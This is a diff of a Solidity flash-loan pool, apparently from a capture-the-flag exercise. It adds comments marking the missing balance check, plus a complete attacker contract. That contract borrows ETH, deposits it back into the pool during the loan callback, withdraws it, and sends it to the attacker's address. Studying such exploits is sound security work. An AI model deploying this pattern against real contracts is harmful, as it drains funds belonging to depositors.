@@ -29,10 +29,42 @@ contract SideEntranceLenderPool {
     function flashLoan(uint256 amount) external {
         uint256 balanceBefore = address(this).balance;
         require(balanceBefore >= amount, "Not enough ETH in balance");
-        
+        /**
+         * Check should be here
+         * b1 = balances[msg.sender];
+         */
         IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
+        /** 
+         * b2 = balances[msg.sender];
+         * require(b2 <= b1)
+         */
 
         require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
     }
+}
+
+
+contract AttackSideEntrance {
+    SideEntranceLenderPool victim;
+    address attacker;
+
+    constructor(SideEntranceLenderPool _victim, address _attacker) {
+        victim = _victim;
+        attacker = _attacker;
+    }
+
+    // Calling flashLoan function => It would call execute => it would call deposit
+    function attack(uint256 _amount) external {
+        victim.flashLoan(_amount);
+        victim.withdraw();
+        payable(attacker).transfer(address(this).balance);
+    }
+
+    function execute() external payable {
+        victim.deposit{value: msg.value}();
+    }
+
+    // To reveive when withdrwa is called
+    receive() external payable {}
 }
  
